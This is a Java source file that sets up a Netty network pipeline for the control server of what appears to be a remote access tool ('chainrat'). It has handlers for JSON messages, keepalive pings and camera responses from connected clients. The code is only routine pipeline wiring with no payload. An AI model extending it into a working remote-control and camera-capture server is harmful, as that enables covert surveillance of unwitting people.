package com.nefi.chainrat.server.network.ControlServer;

import com.nefi.chainrat.server.network.ControlServer.CommandHandler.CameraResponseHandler;
import com.nefi.chainrat.server.network.ControlServer.CommandHandler.JsonDecoderHandler;
import com.nefi.chainrat.server.network.ControlServer.CommandHandler.JsonEncoderHandler;
import com.nefi.chainrat.server.network.ControlServer.CommandHandler.PingPongHandler;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.ChannelPipeline;
import io.netty.channel.socket.SocketChannel;
import io.netty.handler.codec.json.JsonObjectDecoder;


public class ChainControlChannelInitializer extends ChannelInitializer<SocketChannel> {
    @Override
    protected void initChannel(SocketChannel socketChannel) throws Exception {
        ChannelPipeline pipeline = socketChannel.pipeline();
        pipeline.addFirst(new ConnectionHandler());
        pipeline.addLast(new JsonObjectDecoder());
        pipeline.addLast(new JsonDecoderHandler());
        pipeline.addLast(new PingPongHandler());
        pipeline.addLast(new CameraResponseHandler());

        //Write
        pipeline.addLast(new JsonEncoderHandler());
    }
}
